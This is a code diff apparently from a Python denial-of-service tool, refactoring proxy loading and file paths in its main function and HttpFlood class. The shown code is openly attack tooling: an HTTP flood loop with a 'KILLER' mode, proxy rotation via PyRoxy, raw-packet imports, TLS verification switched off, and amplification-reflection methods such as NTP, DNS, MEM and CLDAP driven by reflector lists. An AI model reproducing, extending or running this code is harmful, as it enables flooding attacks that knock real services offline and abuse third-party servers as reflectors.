@@ -18,14 +18,14 @@ from typing import Any, List, Set, Tuple
 from urllib import parse
 from uuid import UUID, uuid4
 
+from PyRoxy import Proxy, ProxyType, ProxyUtiles, Tools as ProxyTools
 from certifi import where
 from cloudscraper import create_scraper
 from impacket.ImpactPacket import IP, TCP, UDP, Data
 from requests import Response, Session, get, cookies
 from yarl import URL
 
-from PyRoxy import Proxy, ProxyType, ProxyUtiles, Tools as ProxyTools
-from core import cl, logger
+from .core import cl, logger, ROOT_DIR
 
 
 ctx: SSLContext = create_default_context(cafile=where())
@@ -33,7 +33,6 @@ ctx.check_hostname = False
 ctx.verify_mode = CERT_NONE
 
 __version__: str = "2.4 SNAPSHOT"
-__dir__: Path = Path(__file__).parent
 __ip__: Any = None
 
 SOCK_TIMEOUT = 5
@@ -660,7 +659,7 @@ class HttpFlood:
              "Content-Type: application/json\r\n\r\n"
              '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
         s = None
-        with  suppress(Exception), self.open_connection() as s:
+        with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
@@ -1007,7 +1006,7 @@ class HttpFlood:
         if name == "KILLER": self.SENT_FLOOD = self.KILLER
 
 
-def main(url, ip, method, threads, event, thread_pool, proxy_fn=None, rpc=None, refl_li_fn=None, statistics=None, sock_timeout=5):
+def main(url, ip, method, threads, event, thread_pool, proxies, rpc=None, refl_li_fn=None, statistics=None, sock_timeout=5):
     REQUESTS_SENT = statistics['requests']
     BYTES_SEND = statistics['bytes']
     global SOCK_TIMEOUT
@@ -1016,14 +1015,9 @@ def main(url, ip, method, threads, event, thread_pool, proxy_fn=None, rpc=None, 
     if method not in Methods.ALL_METHODS:
         exit("Method Not Found %s" % ", ".join(Methods.ALL_METHODS))
 
-    proxies = None
-    if proxy_fn:
-        proxy_li = Path(__dir__ / "files/proxies/" / proxy_fn)
-        proxies = ProxyUtiles.readFromFile(proxy_li)
-
     if method in Methods.LAYER7_METHODS:
-        useragent_li = Path(__dir__ / "files/useragent.txt")
-        referers_li = Path(__dir__ / "files/referers.txt")
+        useragent_li = ROOT_DIR / "files/useragent.txt"
+        referers_li = ROOT_DIR / "files/referers.txt"
         bombardier_path = Path.home() / "go/bin/bombardier"
 
         if method == "BOMB":
@@ -1072,7 +1066,7 @@ def main(url, ip, method, threads, event, thread_pool, proxy_fn=None, rpc=None, 
 
         ref = None
         if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
-            refl_li = Path(__dir__ / "files" / refl_li_fn)
+            refl_li = ROOT_DIR / "files" / refl_li_fn
             if not refl_li.exists():
                 exit("The reflector file doesn't exist")
             ref = set(
